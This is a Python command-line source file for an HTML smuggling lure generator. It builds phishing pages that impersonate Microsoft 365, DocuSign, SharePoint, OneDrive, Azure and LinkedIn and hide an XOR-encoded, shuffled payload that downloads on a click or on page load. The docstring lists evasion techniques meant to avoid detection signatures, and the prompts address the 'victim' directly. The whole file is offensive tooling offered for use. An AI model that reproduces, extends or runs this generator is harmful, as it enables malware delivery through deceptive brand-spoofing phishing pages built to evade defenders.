#!/usr/bin/env python3
"""
SmuggleMyPayload — HTML Smuggling Lure Generator
Developed by Maverick

Embeds a base64-encoded payload inside an HTML lure page.
JavaScript decodes and triggers download via Blob/URL.createObjectURL.
No separate HTTP request needed — the payload is fully self-contained.

Templates: MS365 MFA, DocuSign, SharePoint, OneDrive, Azure, LinkedIn, Custom
Methods:   Click-to-download (button), Auto-download (page load)

Obfuscation:
  - Randomized JS variable/function names per generation
  - XOR-encoded payload with runtime decoder (no raw base64 visible)
  - Reversed + shuffled chunk ordering with index array
  - Adaptive chunk sizing for payloads up to multi-MB
  - Junk whitespace and comment injection in JS
  - Decoy DOM elements with plausible CSS class names
  - No signatured patterns (no String.fromCharCode, no iframe blob)

Architecture:
  smuggle_logos.py      — Official brand SVG logo data
  smuggle_templates.py  — HTML template strings & style metadata
  smuggle_engine.py     — Core obfuscation, JS gen, and HTML build engine
  smugglemypayload.py   — CLI interface & interactive mode (this file)
"""

import os
import sys
import argparse


from smuggle_logos import DEFAULT_LOGOS, LOGO_HEIGHT, encode_image
from smuggle_templates import TEMPLATES, METHODS, DEFAULT_OUTPUT, STYLES
from smuggle_engine import (
    rand_var, b64_encode, split_b64, sanitize_filename,
    make_deadline, make_timestamp,
    _xor_encode, _split_csv_chunks, _adaptive_chunk_size,
    _generate_junk_ws, _generate_decoy_dom,
    make_smuggle_js, make_trigger_js, build_html,
)


# -- Terminal Colors --

class C:
    R  = '\033[91m'
    G  = '\033[92m'
    Y  = '\033[93m'
    B  = '\033[94m'
    M  = '\033[95m'
    CN = '\033[96m'
    W  = '\033[97m'
    D  = '\033[90m'
    BD = '\033[1m'
    X  = '\033[0m'

def red(s: str) -> str:    return f"{C.R}{s}{C.X}"
def green(s: str) -> str:  return f"{C.G}{s}{C.X}"
def yellow(s: str) -> str: return f"{C.Y}{s}{C.X}"
def blue(s: str) -> str:   return f"{C.B}{s}{C.X}"
def cyan(s: str) -> str:   return f"{C.CN}{s}{C.X}"
def bold(s: str) -> str:   return f"{C.BD}{s}{C.X}"
def dim(s: str) -> str:    return f"{C.D}{s}{C.X}"


BANNER = f"""{C.R}
  ╔═╗┌┬┐┬ ┬┌─┐┌─┐┬  ┌─┐╔╦╗┬ ┬╔═╗┌─┐┬ ┬┬  ┌─┐┌─┐┌┬┐
  ╚═╗││││ ││ ┬│ ┬│  ├┤ ║║║└┬┘╠═╝├─┤└┬┘│  │ │├─┤ ││
  ╚═╝┴ ┴└─┘└─┘└─┘┴─┘└─┘╩ ╩ ┴ ╩  ┴ ┴ ┴ ┴─┘└─┘┴ ┴─┴┘
{C.D}  Developed by Maverick{C.X}
"""


# -- CLI Helpers --

def hr():
    """Print a thin horizontal rule."""
    print(f"  {C.D}{'─' * 52}{C.X}")


def ask(prompt: str, default: str = '') -> str:
    """Prompt user for input with optional default."""
    suffix = f" {C.D}[{default}]{C.X}" if default else ""
    val = input(f"  {C.CN}➜{C.X} {prompt}{suffix}: ").strip()
    return val if val else default


def choose(prompt: str, options: dict) -> str:
    """Display numbered menu and return selected key."""
    print(f"\n  {C.BD}{prompt}{C.X}\n")
    for key, desc in options.items():
        print(f"    {C.Y}[{key}]{C.X}  {desc}")
    while True:
        pick = input(f"\n  {C.CN}➜{C.X} Select: ").strip()
        if pick in options:
            return pick
        print(f"  {C.R}[!] Invalid choice. Try again.{C.X}")


def show_config(config: dict):
    """Display current build configuration summary."""
    hr()
    print(f"  {C.BD}Build Configuration{C.X}\n")
    for label, value in config.items():
        if value:
            print(f"    {C.D}{label:<16}{C.X} {value}")
    hr()


# -- Interactive Mode --

def interactive_mode():
    """Run the tool in menu-driven interactive mode."""
    print(BANNER)
    print(f"  {C.D}Type 'quit' or 'q' at any prompt to exit.{C.X}\n")

    payload_path = None
    payload_data = None
    payload_b64 = None
    download_name = None
    template = None
    method = None
    redirect_url = None
    output_path = None
    custom_opts = None
    logo_path = None

    while True:
        print(f"\n  {C.BD}Main Menu{C.X}\n")
        print(f"    {C.Y}[1]{C.X}  Set payload file")
        print(f"    {C.Y}[2]{C.X}  Set download filename")
        print(f"    {C.Y}[3]{C.X}  Select lure template")
        print(f"    {C.Y}[4]{C.X}  Select delivery method")
        print(f"    {C.Y}[5]{C.X}  Set redirect URL")
        print(f"    {C.Y}[6]{C.X}  Set output filename")
        print(f"    {C.Y}[7]{C.X}  Set brand logo image")
        print(f"    {C.Y}[8]{C.X}  View current config")
        print(f"    {C.G}[9]{C.X}  {C.G}Build lure{C.X}")
        print(f"    {C.R}[0]{C.X}  Exit")

        pick = input(f"\n  {C.CN}➜{C.X} Select: ").strip().lower()

        if pick in ('0', 'q', 'quit', 'exit'):
            print(f"\n  {C.D}Exiting.{C.X}\n")
            sys.exit(0)

        elif pick == '1':
            hr()
            print(f"  {C.BD}Step 1: Payload File{C.X}\n")
            path = ask("Path to payload file")
            if path.lower() in ('q', 'quit'):
                continue
            if not path or not os.path.isfile(path):
                print(f"  {C.R}[!] File not found: {path}{C.X}")
                continue
            payload_path = path
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            payload_b64 = b64_encode(payload_data)
            ps = len(payload_data)
            bs = len(payload_b64)
            print(f"  {C.G}[+]{C.X} Loaded: {bold(payload_path)}")
            print(f"  {C.D}    {ps:,} bytes → {bs:,} base64 chars{C.X}")
            if ps > 2 * 1024 * 1024:
                print(f"  {C.Y}[!] Large payload (>2MB). HTML output will be very large.{C.X}")
            if not download_name:
                download_name = os.path.basename(payload_path)
                print(f"  {C.D}    Download filename auto-set: {download_name}{C.X}")

        elif pick == '2':
            hr()
            print(f"  {C.BD}Step 2: Download Filename{C.X}\n")
            default = download_name or (os.path.basename(payload_path) if payload_path else '')
            name = ask("Filename shown to victim", default)
            if name.lower() in ('q', 'quit'):
                continue
            download_name = name
            print(f"  {C.G}[+]{C.X} Download filename: {bold(download_name)}")

        elif pick == '3':
            hr()
            print(f"  {C.BD}Step 3: Lure Template{C.X}")
            template = choose("Available templates:", TEMPLATES)
            print(f"  {C.G}[+]{C.X} Template: {bold(TEMPLATES[template])}")
            custom_opts = None
            if template == '7':
                print(f"\n  {C.BD}Custom Template Settings{C.X}\n")
                custom_opts = {
                    'title': ask("Page title", "Secure Download"),
                    'heading': ask("Heading", "Your file is ready"),
                    'body': ask("Body text", "Download the file below."),
                    'btn_text': ask("Button text", "Download"),
                    'logo_text': ask("Logo / Brand name", "Download Portal"),
                    'accent': ask("Accent color (hex)", "#0078d4"),
                }
                print(f"  {C.G}[+]{C.X} Custom options saved.")

        elif pick == '4':
            hr()
            print(f"  {C.BD}Step 4: Delivery Method{C.X}")
            method = choose("Available methods:", METHODS)
            print(f"  {C.G}[+]{C.X} Method: {bold(METHODS[method])}")

        elif pick == '5':
            hr()
            print(f"  {C.BD}Step 5: Redirect URL{C.X}\n")
            url = ask("URL to redirect after download (blank to disable)")
            if url.lower() in ('q', 'quit'):
                continue
            redirect_url = url if url else None
            if redirect_url:
                print(f"  {C.G}[+]{C.X} Redirect: {bold(redirect_url)}")
            else:
                print(f"  {C.D}[*] No redirect set.{C.X}")

        elif pick == '6':
            hr()
            print(f"  {C.BD}Step 6: Output Filename{C.X}\n")
            default_out = DEFAULT_OUTPUT.get(template or '1', 'lure.html')
            out = ask("Output HTML filename", default_out)
            if out.lower() in ('q', 'quit'):
                continue
            output_path = out
            print(f"  {C.G}[+]{C.X} Output: {bold(output_path)}")

        elif pick == '7':
            hr()
            print(f"  {C.BD}Step 7: Brand Logo Image{C.X}\n")
            print(f"  {C.D}Supply a real brand logo (png/jpg/svg) for realistic lures.{C.X}")
            print(f"  {C.D}Leave blank to use the default inline SVG.{C.X}\n")
            path = ask("Path to logo image (blank to clear)")
            if path.lower() in ('q', 'quit'):
                continue
            if path and not os.path.isfile(path):
                print(f"  {C.R}[!] File not found: {path}{C.X}")
                continue
            logo_path = path if path else None
            if logo_path:
                print(f"  {C.G}[+]{C.X} Logo: {bold(logo_path)}")
            else:
                print(f"  {C.D}[*] Using default SVG logo.{C.X}")

        elif pick == '8':
            show_config({
                'Payload': payload_path or dim('(not set)'),
                'Payload size': f"{len(payload_data):,} bytes" if payload_data else dim('(not set)'),
                'Download name': download_name or dim('(not set)'),
                'Template': TEMPLATES.get(template, dim('(not set)')),
                'Method': METHODS.get(method, dim('(not set)')),
                'Redirect': redirect_url or dim('(none)'),
                'Logo': logo_path or dim('(default SVG)'),
                'Output': output_path or dim('(auto)'),
            })

        elif pick == '9':
            missing = []
            if not payload_b64:
                missing.append('Payload file (option 1)')
            if not template:
                missing.append('Lure template (option 3)')
            if missing:
                print(f"\n  {C.R}[!] Missing required settings:{C.X}")
                for m in missing:
                    print(f"      {C.R}•{C.X} {m}")
                continue

            if not download_name:
                download_name = os.path.basename(payload_path)
            if not method:
                method = '1'
            if not output_path:
                output_path = DEFAULT_OUTPUT.get(template, 'lure.html')

            show_config({
                'Payload': payload_path,
                'Download name': download_name,
                'Template': TEMPLATES[template],
                'Method': METHODS[method],
                'Redirect': redirect_url or '(none)',
                'Logo': logo_path or '(default SVG)',
                'Output': output_path,
            })

            print(f"\n  {C.BD}Building lure...{C.X}")
            html = build_html(template, payload_b64, download_name, method,
                              redirect_url, custom_opts, logo_path)

            with open(output_path, 'w') as f:
                f.write(html)

            print(f"\n  {C.G}[+] Lure page saved: {bold(output_path)}{C.X}")
            print(f"  {C.D}    HTML size: {len(html):,} bytes{C.X}")
            print()

            again = ask("Build another? (y/n)", "n")
            if again.lower() != 'y':
                print(f"\n  {C.D}Done.{C.X}\n")
                break

        else:
            print(f"  {C.R}[!] Invalid option. Enter 1-9 or 0 to exit.{C.X}")


# -- Entry Point --

def main():
    """Main entry point — supports both CLI args and interactive mode."""
    parser = argparse.ArgumentParser(
        description='SmuggleMyPayload — HTML Smuggling Lure Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument('-p', '--payload', help='Path to payload file')
    parser.add_argument('-n', '--name', help='Download filename shown to victim')
    parser.add_argument('-t', '--template', choices=TEMPLATES.keys(),
                        help='Template (1-7)')
    parser.add_argument('-m', '--method', choices=METHODS.keys(),
                        default='1', help='Delivery method (1=click, 2=auto)')
    parser.add_argument('-r', '--redirect', help='Redirect URL after download')
    parser.add_argument('-o', '--output', help='Output HTML filename')
    parser.add_argument('--title', help='Custom template: page title')
    parser.add_argument('--heading', help='Custom template: heading text')
    parser.add_argument('--body-text', help='Custom template: body text')
    parser.add_argument('--btn-text', help='Custom template: button text')
    parser.add_argument('--logo-text', help='Custom template: logo/brand name')
    parser.add_argument('--accent', help='Custom template: accent color hex')
    parser.add_argument('--logo', help='Path to brand logo image (png/jpg/svg)')

    args = parser.parse_args()

    if not args.payload:
        interactive_mode()
        return

    # CLI mode
    if not os.path.isfile(args.payload):
        print(red(f"[!] File not found: {args.payload}"))
        sys.exit(1)

    with open(args.payload, 'rb') as f:
        payload_data = f.read()
    payload_b64 = b64_encode(payload_data)

    download_name = args.name or os.path.basename(args.payload)
    template = args.template or '1'
    method = args.method or '1'
    redirect_url = args.redirect
    output_path = args.output or DEFAULT_OUTPUT.get(template, 'lure.html')

    custom_opts = None
    if template == '7':
        custom_opts = {
            'title': args.title or 'Secure Download',
            'heading': args.heading or 'Your file is ready',
            'body': getattr(args, 'body_text', None) or 'Download the file below.',
            'btn_text': args.btn_text or 'Download',
            'logo_text': args.logo_text or 'Download Portal',
            'accent': args.accent or '#0078d4',
        }

    logo_path = args.logo
    if logo_path and not os.path.isfile(logo_path):
        print(yellow(f"[!] Logo file not found: {logo_path} — using default SVG"))
        logo_path = None

    html = build_html(template, payload_b64, download_name, method,
                      redirect_url, custom_opts, logo_path)

    with open(output_path, 'w') as f:
        f.write(html)

    print(f"{green('[+]')} Lure page saved: {bold(output_path)} ({len(html):,} bytes)")
    print(f"    Template: {TEMPLATES[template]} | Method: {METHODS[method]}")
    print(f"    Filename: {download_name}")
    if logo_path:
        print(f"    Logo:     {logo_path}")
    if redirect_url:
        print(f"    Redirect: {redirect_url}")


if __name__ == '__main__':
    main()
